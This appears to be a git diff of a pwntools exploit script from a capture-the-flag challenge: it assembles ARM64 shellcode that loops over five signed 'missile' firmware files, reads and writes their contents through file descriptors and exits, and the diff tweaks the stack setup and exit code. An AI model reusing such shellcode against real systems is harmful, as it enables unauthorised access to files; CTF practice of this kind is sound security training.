@@ -1,9 +1,9 @@
 from pwn import *
 
-elf = context.binary = ELF("/home/kali/cybertalent/fracture")
+context.binary = ELF("/home/kali/cybertalent/fracture")
 
 command = b"flsh"
-shellcode = "sub sp, sp, #0x100\n"
+shellcode = ""
 
 for i in range(5):
     firmware = f"/firmware/missile.1.3.37.fw_sub{i + 1}_signed"
@@ -20,8 +20,7 @@ for i in range(5):
         shellcode += shellcraft.mov("x11", "x0")
         shellcode += shellcraft.close("x12")
         shellcode += shellcraft.write(0x4, "sp", "x11")
-
-shellcode += shellcraft.exit(1)
+shellcode += shellcraft.exit(69)
 
 compiled_shellcode = asm(shellcode)
 print("Length of shellcode:", len(compiled_shellcode))
